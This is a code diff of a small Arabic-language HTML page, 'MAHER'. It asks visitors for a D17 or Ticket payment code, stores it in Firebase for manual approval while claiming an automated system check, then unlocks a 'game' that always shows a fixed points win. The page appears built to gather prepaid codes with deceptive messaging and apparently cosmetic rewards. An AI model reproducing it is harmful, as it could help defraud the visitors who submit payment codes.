@@ -6,57 +6,76 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
-        body { background: #050505; color: #00ff41; font-family: monospace; text-align: center; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .box { border: 2px solid #00ff41; padding: 20px; width: 350px; }
-        input, button { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff41; color: #fff; }
-        button { background: #00ff41; color: #000; font-weight: bold; cursor: pointer; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; text-align: center; }
+        .vault { border: 2px solid #00ff41; padding: 30px; width: 350px; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        input, button { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #00ff41; color: #fff; font-family: inherit; }
+        button { background: #00ff41; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #000; color: #00ff41; }
         .hidden { display: none; }
+        #status { font-size: 0.8rem; color: #ff3e3e; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>MAHER PROTOCOL</h1>
-    
-    <div id="step-1">
-        <p>أدخل كود 1 DT (D17 أو شحن)</p>
-        <input type="text" id="code" placeholder="أدخل الكود هنا">
-        <button onclick="sendData()">إرسال وتفعيل</button>
+<div class="vault">
+    <h1>MAHER</h1>
+    <div id="status">STATUS: LOCKED</div>
+
+    <div id="step-pay">
+        <p>أدخل كود المرور (D17 أو Ticket)</p>
+        <input type="text" id="user-code" placeholder="أدخل الكود هنا">
+        <button onclick="requestAccess()">طلب تفعيل</button>
     </div>
 
-    <div id="step-2" class="hidden">
-        <h2>تم التفعيل</h2>
-        <p>نقاطك: <span id="pts">0</span></p>
-        <button onclick="addPoints()">العب الآن واربح نقاط</button>
+    <div id="step-wait" class="hidden">
+        <p>جاري فحص الكود من قبل النظام...</p>
+        <div style="animation: pulse 1s infinite;">⚙️ مراجعة يدوية...</div>
+    </div>
+
+    <div id="step-vault" class="hidden">
+        <p>مرحباً بك في النخبة</p>
+        <div id="display" style="font-size: 2rem; margin: 20px;">000000</div>
+        <button onclick="play()">تجميد التشفير</button>
     </div>
 </div>
 
 <script>
-    // الإعدادات مأخوذة من صورتك مباشرة
     const firebaseConfig = {
         databaseURL: "https://m-token-5ce65-default-rtdb.europe-west1.firebasedatabase.app/"
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function sendData() {
-        const c = document.getElementById('code').value;
-        if(c.length < 4) return alert("الكود قصير");
+    let myId = "User_" + Math.floor(Math.random() * 10000);
 
-        // سيقوم هذا السطر بإنشاء البيانات فوراً في Firebase التي كانت فارغة في صورتك
-        db.ref('test_entries').push({
-            code_sent: c,
-            status: "active"
+    function requestAccess() {
+        const c = document.getElementById('user-code').value;
+        if(c.length < 5) return alert("الكود قصير جداً");
+
+        // إرسال الطلب وحالته "false" (غير مقبول)
+        db.ref('requests/' + myId).set({
+            code: c,
+            approved: false
         });
 
-        document.getElementById('step-1').classList.add('hidden');
-        document.getElementById('step-2').classList.remove('hidden');
+        document.getElementById('step-pay').classList.add('hidden');
+        document.getElementById('step-wait').classList.remove('hidden');
+
+        // الاستماع للتغيير: بمجرد أن تغيرها أنت لـ true في Firebase سيفتح الموقع تلقائياً
+        db.ref('requests/' + myId + '/approved').on('value', (snap) => {
+            if(snap.val() === true) {
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-vault').classList.remove('hidden');
+                document.getElementById('status').innerText = "STATUS: GRANTED";
+                document.getElementById('status').style.color = "#00ff41";
+            }
+        });
     }
 
-    function addPoints() {
-        let p = Math.floor(Math.random() * 100);
-        document.getElementById('pts').innerText = p;
-        alert("ربحت " + p + " نقطة!");
+    function play() {
+        let d = document.getElementById('display');
+        let spin = setInterval(() => { d.innerText = Math.floor(Math.random()*900000); }, 50);
+        setTimeout(() => { clearInterval(spin); d.innerText = "SUCCESS: +100 PTS"; }, 1500);
     }
 </script>
 </body>
